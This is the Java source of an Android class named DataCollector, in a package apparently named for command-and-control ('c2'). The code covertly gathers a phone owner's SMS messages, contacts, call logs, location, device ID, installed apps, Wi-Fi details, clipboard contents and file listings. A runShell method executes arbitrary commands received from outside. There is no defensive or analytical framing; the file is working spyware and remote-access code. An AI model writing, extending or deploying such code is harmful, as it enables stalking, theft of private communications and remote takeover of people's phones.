          package com.vanta.c2;
          import android.Manifest;
          import android.content.*;
          import android.content.pm.*;
          import android.database.Cursor;
          import android.location.*;
          import android.net.Uri;
          import android.net.wifi.*;
          import android.os.*;
          import android.provider.*;
          import androidx.core.content.ContextCompat;
          import java.io.*;
          import java.text.SimpleDateFormat;
          import java.util.*;
          public class DataCollector {
              private final Context ctx;
              public DataCollector(Context c) { ctx = c; }
              public String getSms() {
                  if (!has(Manifest.permission.READ_SMS)) return "no permission";
                  StringBuilder sb = new StringBuilder("SMS:\n");
                  try (Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50")) {
                      if (c == null) return "fail";
                      SimpleDateFormat f = new SimpleDateFormat("MM-dd HH:mm", Locale.US);
                      while (c.moveToNext())
                          sb.append(f.format(new Date(c.getLong(c.getColumnIndexOrThrow("date")))))
                            .append(" ").append(c.getString(c.getColumnIndexOrThrow("address")))
                            .append(": ").append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
                  } catch (Exception e) { return "err: " + e.getMessage(); }
                  return sb.toString();
              }
              public String getContacts() {
                  if (!has(Manifest.permission.READ_CONTACTS)) return "no permission";
                  StringBuilder sb = new StringBuilder("Contacts:\n");
                  try (Cursor c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
                      if (c == null) return "fail";
                      int n = 0;
                      while (c.moveToNext() && n++ < 500) {
                          sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" - ")
                            .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                      }
                  } catch (Exception e) { return "err: " + e.getMessage(); }
                  return sb.toString();
              }
              public String getCallLog() {
                  if (!has(Manifest.permission.READ_CALL_LOG)) return "no permission";
                  StringBuilder sb = new StringBuilder("Calls:\n");
                  try (Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100")) {
                      if (c == null) return "fail";
                      SimpleDateFormat f = new SimpleDateFormat("MM-dd HH:mm", Locale.US);
                      while (c.moveToNext()) {
                          int t = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                          String ts = t == CallLog.Calls.INCOMING_TYPE ? "IN" : t == CallLog.Calls.OUTGOING_TYPE ? "OUT" : "MISS";
                          sb.append(f.format(new Date(c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE)))))
                            .append(" ").append(ts).append(" ").append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
                      }
                  } catch (Exception e) { return "err: " + e.getMessage(); }
                  return sb.toString();
              }
              public String getLocation() {
                  try {
                      LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                      if (lm == null) return "n/a";
                      Location best = null;
                      for (String p : lm.getProviders(true)) {
                          Location l = lm.getLastKnownLocation(p);
                          if (l == null) continue;
                          if (best == null || l.getTime() > best.getTime()) best = l;
                      }
                      if (best == null) return "no location";
                      return String.format(Locale.US, "Loc:\n%.6f, %.6f\nhttps://maps.google.com/?q=%.6f,%.6f",
                          best.getLatitude(), best.getLongitude(), best.getLatitude(), best.getLongitude());
                  } catch (Exception e) { return "err: " + e.getMessage(); }
              }
              public String getDeviceInfo() {
                  return "Brand: " + Build.BRAND + "\nModel: " + Build.MODEL +
                      "\nAndroid: " + Build.VERSION.RELEASE +
                      "\nID: " + Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
              }
              public String getInstalledApps() {
                  StringBuilder sb = new StringBuilder("Apps:\n");
                  PackageManager pm = ctx.getPackageManager();
                  for (ApplicationInfo ai : pm.getInstalledApplications(0))
                      sb.append(pm.getApplicationLabel(ai)).append(" - ").append(ai.packageName).append("\n");
                  return sb.toString();
              }
              public String getWifiInfo() {
                  try {
                      WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                      if (wm == null) return "n/a";
                      WifiInfo wi = wm.getConnectionInfo();
                      if (wi == null) return "no wifi";
                      return "SSID: " + wi.getSSID() + "\nBSSID: " + wi.getBSSID() + "\n" + wi.getLinkSpeed() + " Mbps";
                  } catch (Exception e) { return "err"; }
              }
              public String getClipboard() {
                  try {
                      ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                      if (cm == null || !cm.hasPrimaryClip()) return "empty";
                      ClipData cd = cm.getPrimaryClip();
                      if (cd == null || cd.getItemCount() == 0) return "empty";
                      return cd.getItemAt(0).coerceToText(ctx).toString();
                  } catch (Exception e) { return "err"; }
              }
              public String listFiles(String path) {
                  File dir = new File(path);
                  if (!dir.exists()) return "not found";
                  if (!dir.isDirectory()) return "not dir";
                  File[] files = dir.listFiles();
                  if (files == null) return "cannot read";
                  StringBuilder sb = new StringBuilder(path + "\n\n");
                  int n = 0;
                  for (File f : files) {
                      if (n++ > 200) { sb.append("...\n"); break; }
                      sb.append(f.isDirectory() ? "[D] " : "[F] ").append(f.getName()).append("\n");
                  }
                  return sb.toString();
              }
              public String runShell(String cmd) {
                  StringBuilder out = new StringBuilder();
                  try {
                      Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                      BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                      String l; while ((l = r.readLine()) != null) out.append(l).append("\n");
                      r = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                      while ((l = r.readLine()) != null) out.append("[e] ").append(l).append("\n");
                      p.waitFor();
                  } catch (Exception e) { return "err: " + e.getMessage(); }
                  return out.length() == 0 ? "(no output)" : out.toString();
              }
              public int getBattery() {
                  try {
                      BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
                      return bm != null ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;
                  } catch (Exception e) { return -1; }
              }
              private boolean has(String p) { return ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED; }
          }
